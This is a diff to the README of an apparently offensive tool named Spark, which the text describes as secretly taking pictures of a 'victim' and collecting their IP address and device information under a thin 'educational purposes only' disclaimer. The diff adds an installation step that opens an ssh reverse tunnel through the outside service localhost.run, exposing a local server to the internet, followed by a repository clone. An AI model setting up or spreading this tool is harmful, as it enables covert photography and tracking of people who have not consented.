@@ -10,7 +10,10 @@ This tool is only for educational purposes only and any illegal use is relating 
 This tool is for taking picture secretly from victim and get Ip and device info
 
 ## Installation 
-
+- Run this command on your terminal and type yes
+```
+ssh -R 80:localhost:80 nokey@localhost.run
+``` 
 - Clone this repository
 ```
 git clone https://github.com/T-Onix/Spark.git
